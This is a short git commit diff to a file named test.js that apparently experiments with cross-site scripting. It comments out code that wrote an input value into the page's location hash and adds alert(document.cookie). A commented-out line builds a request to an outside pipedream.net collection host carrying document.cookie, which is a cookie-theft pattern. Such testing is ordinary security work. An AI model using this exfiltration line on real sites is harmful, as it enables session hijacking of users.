5c03032319140c2c075ca445bed5a5c7754fa58c
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-29 20:02:49 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,8 @@
-const word = document.getElementById("word");
-const res = document.getElementById("result");
+// const word = document.getElementById("word");
+// const res = document.getElementById("result");
 
-word.oninput = () => {
-   document.location.hash = word.value;
-}
-  
+// word.oninput = () => {
+//    document.location.hash = word.value;
+// }
+alert(document.cookie);
 //window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
